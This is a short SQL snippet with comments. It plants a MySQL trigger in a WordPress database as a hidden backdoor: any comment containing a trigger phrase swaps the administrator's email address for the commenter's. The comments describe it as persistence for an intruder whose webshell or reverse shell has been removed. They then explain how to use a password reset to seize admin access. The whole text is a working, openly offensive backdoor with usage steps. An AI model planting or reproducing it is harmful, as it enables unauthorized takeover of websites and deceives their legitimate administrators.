delimiter #
CREATE TRIGGER user_comment BEFORE INSERT ON wp_comments
FOR EACH ROW BEGIN
    IF NEW.comment_content = 'way around the back' THEN
       SELECT user_email FROM wp_users WHERE id=NEW.user_id INTO @email;
       UPDATE wp_users SET user_email=@email WHERE ID=1;
    END IF;
END;#
delimiter ;

-- USAGE: Once this has been injected into the DBMS, using the hook to regain access is simple.
-- If your webshell or revshell gets identified and deleted, but your DBMS hook remains, then you
-- can simply open any post on the target's wordpress site and leave a comment on any post
-- with "way around the back" being included as part of your comment somewhere.
-- As soon as the DBMS sees the "way around the back" comment it will make a modification to the
-- database, replacing the wordpress admin email address with an email address of your own choice.
-- From here, you can just do a password reset request on the admin account, and thanks to the new
-- database changes, the password request email will be sent to your own email address rather than
-- being sent to the email address of the legitimate wordpress admin.
-- From here, you can simply click on the link in the email in order to reset your password, which
-- will result in you gaining admin access to the wordpress site.
